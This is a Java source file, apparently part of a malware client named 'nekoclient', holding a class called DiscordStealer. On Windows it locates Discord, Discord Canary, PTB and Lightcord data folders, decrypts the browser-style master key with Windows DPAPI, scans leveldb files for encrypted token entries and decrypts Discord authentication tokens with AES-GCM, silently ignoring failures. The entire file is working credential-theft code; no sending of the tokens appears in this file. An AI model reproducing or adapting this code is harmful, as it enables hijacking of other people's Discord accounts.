package dev.neko.nekoclient.api.stealer.discord.impl;

import com.eclipsesource.json.Json;
import com.sun.jna.Platform;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class DiscordStealer {
   public static List<String> retrieve() {
      List<String> tokens = new ArrayList<>();
      if (!Platform.isWindows()) {
         return tokens;
      } else {
         retrieveLocalDiscordInstallationSafely(tokens, "discord");
         retrieveLocalDiscordInstallationSafely(tokens, "discordcanary");
         retrieveLocalDiscordInstallationSafely(tokens, "discordptb");
         retrieveLocalDiscordInstallationSafely(tokens, "Lightcord");
         return tokens;
      }
   }

   private static void retrieveLocalDiscordInstallationSafely(List<String> tokens, String channel) {
      try {
         retrieveLocalDiscordInstallation(tokens, channel);
      } catch (Throwable var3) {
      }
   }

   private static void retrieveLocalDiscordInstallation(List<String> tokens, String channel) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, IOException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
      Path path = Paths.get(System.getenv("APPDATA"), channel);
      retrieveChromeTokens(tokens, path.resolve("Local State"), path.resolve("Local Storage").resolve("leveldb"));
   }

   private static void retrieveChromeTokens(List<String> tokens, Path localState, Path localStorage) throws IOException, InvalidAlgorithmParameterException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException {
      if (Files.exists(localState) && Files.exists(localStorage)) {
         byte[] encodedKey = Base64.getDecoder()
            .decode(Json.parse(new InputStreamReader(Files.newInputStream(localState))).asObject().get("os_crypt").asObject().get("encrypted_key").asString());
         byte[] key = Arrays.copyOfRange(encodedKey, 5, encodedKey.length);
         Pattern pattern = Pattern.compile("dQw4w9WgXcQ:([^\"]*)\"");

         for(Path path : Files.walk(localStorage).filter(pathx -> pathx.getFileName().toString().endsWith(".ldb")).collect(Collectors.toList())) {
            Matcher matcher = pattern.matcher(new String(Files.readAllBytes(path)));

            while(matcher.find()) {
               byte[] encryptedToken = Base64.getDecoder().decode(matcher.group(1));
               Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
               cipher.init(
                  2, new SecretKeySpec(Crypt32Util.cryptUnprotectData(key), "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(encryptedToken, 3, 15))
               );
               String token = new String(cipher.doFinal(Arrays.copyOfRange(encryptedToken, 15, encryptedToken.length)));
               if (!tokens.contains(token)) {
                  tokens.add(token);
               }
            }
         }
      }
   }
}
